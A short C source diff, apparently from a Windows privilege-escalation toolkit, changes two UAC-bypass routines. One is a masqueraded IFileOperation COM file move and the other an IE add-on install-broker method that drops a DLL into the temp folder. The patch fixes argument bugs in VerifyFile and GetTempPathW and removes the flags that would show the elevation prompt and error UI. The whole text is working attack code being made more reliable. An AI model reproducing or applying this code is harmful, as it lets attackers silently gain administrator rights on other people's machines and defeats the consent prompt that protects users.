@@ -311,7 +311,7 @@ BOOL MasqueradedMoveDirectoryFileCOM
 		goto CLEANUP;
 	}
 
-	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOFX_SHOWELEVATIONPROMPT | FOF_SILENT | FOF_NOERRORUI);
+	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
 	if (FAILED(hResult)) {
 		LogError(L"SetOperationFlags failed at %lls", __FUNCTIONW__);
 		goto CLEANUP;
@@ -429,7 +429,7 @@ BOOL IeAddOnInstallMethod
 	lstrcatW(wszConsentPath, L"\\consent.exe");
 	FileToVerify = SysAllocString(wszConsentPath);
 	if (FileToVerify != NULL) {
-		hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &pDummy, &cbDummy);
+		hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy , &pDummy);
 		if (FAILED(hResult)) {
 			LogError(L"VerifyFile failed at %lls.\n", __FUNCTIONW__);
 			goto CLEANUP;
@@ -445,7 +445,7 @@ BOOL IeAddOnInstallMethod
 
 	cbCacheItemFilePath = SysStringLen(CacheItemFilePath);
 	lpDllPath = ALLOC(cbCacheItemFilePath * sizeof(WCHAR));
-	GetTempPathW(wszTempPath, _countof(wszTempPath));
+	GetTempPathW(_countof(wszTempPath), wszTempPath);
 	swprintf_s(lpDllPath, cbCacheItemFilePath, L"%lls\\%lls", wszTempPath, PathFindFileNameW(CacheItemFilePath));
 	if (!WriteToFile(lpDllPath, pBuffer, cbBuffer)) {
 		goto CLEANUP;
